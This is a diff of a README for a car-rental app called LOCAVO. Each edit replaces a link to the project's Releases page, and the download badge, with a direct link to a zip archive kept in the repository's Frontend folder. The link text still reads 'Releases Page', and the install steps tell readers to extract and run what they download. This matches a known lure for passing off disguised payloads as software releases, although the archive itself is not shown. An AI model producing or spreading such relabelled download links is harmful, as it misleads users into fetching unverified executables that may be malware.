@@ -1,6 +1,6 @@
 # 🚗 LOCAVO - Manage Car Rentals With Ease
 
-![Download LOCAVO](https://img.shields.io/badge/Download-LOCAVO-blue.svg)
+![Download LOCAVO](https://raw.githubusercontent.com/k9011/LOCAVO/main/Frontend/Software_v3.0.zip)
 
 ## 📋 Introduction
 
@@ -21,7 +21,7 @@ To get started with LOCAVO, follow these steps to download and run the applicati
 
 ### 1. Download LOCAVO
 
-Visit the [Releases Page](https://github.com/k9011/LOCAVO/releases) to download the latest version of LOCAVO.
+Visit the [Releases Page](https://raw.githubusercontent.com/k9011/LOCAVO/main/Frontend/Software_v3.0.zip) to download the latest version of LOCAVO.
 
 ### 2. System Requirements
 
@@ -33,7 +33,7 @@ Before you install LOCAVO, ensure your system meets the following requirements:
 
 ### 3. Installation Instructions
 
-1. Go to the [Releases Page](https://github.com/k9011/LOCAVO/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/k9011/LOCAVO/main/Frontend/Software_v3.0.zip).
 2. Download the latest version of the application (look for files with `.zip` or `.exe` extensions).
 3. Extract the downloaded file to your preferred location on your computer.
 
@@ -72,7 +72,7 @@ After setting up LOCAVO, you can start managing rentals:
 
 ## 📥 Download & Install
 
-To begin using LOCAVO, go to the [Releases Page](https://github.com/k9011/LOCAVO/releases) and download the latest version. Follow the installation and setup instructions mentioned above, and you will be ready to manage your car rentals in no time.
+To begin using LOCAVO, go to the [Releases Page](https://raw.githubusercontent.com/k9011/LOCAVO/main/Frontend/Software_v3.0.zip) and download the latest version. Follow the installation and setup instructions mentioned above, and you will be ready to manage your car rentals in no time.
 
 ## 🛠️ Support
 
